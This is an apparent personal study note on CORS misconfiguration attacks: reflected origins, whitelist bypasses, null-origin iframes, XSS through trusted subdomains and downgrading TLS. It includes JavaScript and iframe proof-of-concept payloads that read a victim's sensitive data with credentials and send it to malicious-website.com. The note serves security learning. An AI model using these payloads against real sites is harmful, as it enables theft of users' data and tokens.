# Cross-Origin Resource Sharing (CORS)
#Access-Control #CORS #CSRF #SOP

Cross-origin resource sharing (CORS) enables controlled access to resources located **outside** of a given **domain**. It extends and adds flexibility to the [same-origin policy (SOP)](Cross-Origin%20Resource%20Sharing%20(CORS)#Same-Origin%20Policy%20SOP). However, it also provides potential for **cross-domain** attacks, if a website's CORS policy is poorly configured and implemented. CORS is not a protection against cross-origin attacks such as [cross-site request forgery (CSRF)](Cross-Site%20Request%20Forgery%20(CSRF).md)

## Same-Origin Policy (SOP)
The same-origin policy (SOP) is a **restrictive cross-origin** specification that limits the ability for a website to interact with resources **outside** of the source domain. The same-origin policy was defined many years ago in response to potentially **malicious** cross-domain interactions, such as one website stealing **private** data from another. It generally allows a domain to issue requests to other domains, but **not** to access the responses.

## HTTP Origin Headers
*Most CORS attacks rely on the response header `Allow-Control-Allow-Credentials: true`. Without this header, the victims browser will **refuse** to send their **cookies**, meaning the attacker will only gain access to **unauthenticated** content.*

### Server-Generated ACAO Header From Client-Specified Origin Header
Some servers will read the `Origin` header from requests and include a header within the response stating that the requesting origin is allowed. Take the following request for example:
``` Request
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
```

The server would respond with the following:
``` Response
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
...
```

As the application **reflects** arbitrary origins in the `Access-Control-Allow-Origin` header, this means that **any domain** can access resources from the vulnerable domain. If the response contains any **sensitive** information such as an API key or [CSRF Token](Cross-Site%20Request%20Forgery%20(CSRF)#CSRF%20Tokens), you could retrieve this using some code such as the following:

```JavaScript
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
   location='//malicious-website.com/log?key='+this.responseText;
};
```

### Errors Parsing Origin Headers
Some applications that support access from **multiple** origins use a **whitelist** of allowed origins. When a CORS request is received, the supplied origin is compared to the **whitelist**. If the origin appears on the whitelist then it is reflected in the `Access-Control-Allow-Origin` header so that access is granted.

Should the domain  `normal-website.com` be on the **whitelist** then an attacker may be able to abuse this by using origin domains which **contain** the **whitelisted** string, for example, `maliciousnormal-website.com` or `normal-website.com.malicious.net`

### Whitelisted Null Origin Value
Some applications might **whitelist** the `null` origin to support local **development** of the application.

In this case, an attacker can generate a **cross-origin** request containing the value `null` in the `Origin` header. This will satisfy the **whitelist**, leading to **cross-domain** access.

An example of how this can be done using a **sandboxed** `iframe` can be seen below:
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>
```

## Exploiting XSS Via CORS Trust Relationships
If a website trusts an origin that is **vulnerable** to [cross-site scripting (XSS)](Cross-Site%20Scripting%20(XSS).md), then an attacker could exploit the [cross-site scripting (XSS)](Cross-Site%20Scripting%20(XSS).md) to **inject** some **JavaScript** which uses CORS to retrieve **sensitive** information from the site that **trusts** the vulnerable application.

For example should a website trust a vulnerable **subdomain** the following could be used to request **sensitive** data:
`https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>`

## Breaking TLS With Misconfigured CORS
Some applications that **enforce HTTPS** also whitelist plain HTTP domains. In this situation an attacker who is in a position to **intercept** a victims traffic can **exploit** the CORS misconfiguration to **compromise** the victim's interaction with the site.

This type of attack follows the below steps:
1. The victim user makes **any** HTTP request.
2. The attacker **injects** a **redirection** to `http://trusted-subdomain.website.com`
3. The victim's browser follows the redirect.
4. The attacker **intercepts** the HTTP request, and returns a spoofed **response** containing a CORS request to `https://website.com`
5. The victim's browser makes the CORS request, including the **origin** `http://trusted-subdomain.website.com`
6. The application **allows** the request because this is a **whitelisted** origin. The requested **sensitive** data is returned in the response.
7. The attacker's **spoofed** page can read the **sensitive** data and **transmit** it to **any** domain under the attackers control

